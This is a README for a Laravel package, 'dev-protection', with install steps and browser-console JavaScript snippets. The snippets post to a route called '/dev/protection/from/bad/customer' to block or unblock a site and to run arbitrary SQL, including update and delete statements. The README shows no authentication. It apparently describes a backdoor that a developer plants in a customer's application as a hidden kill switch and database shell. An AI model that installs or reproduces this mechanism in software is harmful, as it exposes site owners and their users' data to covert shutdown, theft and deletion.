## Installation

### Step 1: Composer

From the command line, run:

```
composer require masterro/dev-protection
```

### Step 2: Service Provider

For your Laravel app, open `config/app.php` and, within the `providers` array, append:

```
MasterRO\DevProtection\DevProtectionServiceProvider::class
```


## Usage

In browser open JavaScript console and run

### To block
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'block');

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```

### To unblock
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'unblock');

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```

### To run sql query
```javascript
var xhr = new XMLHttpRequest();
var data = new FormData;

data.append('action', 'query');
data.append('params[]', 'select * from users'); // sql
data.append('params[]', 'select'); // query type - available types: select, update, delete, statement

xhr.open("POST", '/dev/protection/from/bad/customer', true);

xhr.send(data);
```